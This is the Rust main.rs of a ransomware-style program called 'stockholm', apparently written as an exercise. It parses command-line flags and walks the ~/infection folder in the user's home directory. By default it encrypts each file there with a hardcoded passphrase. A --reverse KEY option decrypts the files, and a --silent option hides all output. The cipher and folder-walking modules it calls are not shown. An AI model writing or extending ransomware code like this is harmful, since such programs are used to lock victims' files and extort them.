mod cipher;
mod log;
mod stockholm;

use crate::stockholm::{CallbackFn, decrypt_file, encrypt_file, visit_folder};
use clap::Parser;
use std::env;

pub const PASSPHRASE: &str = "@9#MX3cNJ$@zFq&R";

#[derive(Debug, Parser)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(
        short,
        long,
        value_name = "KEY",
        help = "Reverse the infection with the KEY"
    )]
    reverse: Option<String>,

    #[arg(short, long, default_value_t = false, help = "Silent any output")]
    silent: bool,
}

fn main() {
    let args = Args::parse();
    if !args.silent {
        log::init_logger();
    }

    let (passphrase, func): (String, &CallbackFn) = match args.reverse {
        Some(key) => (key, &decrypt_file),
        None => (PASSPHRASE.to_string(), &encrypt_file),
    };

    let mut home_dir = env::home_dir().expect("Impossible to get your home dir!");
    home_dir.push("infection");

    match visit_folder(&home_dir, func, &passphrase) {
        Ok(count) => log::info!("Modified {} files", count),
        Err(e) => log::error!("Error: {}", e),
    }
}
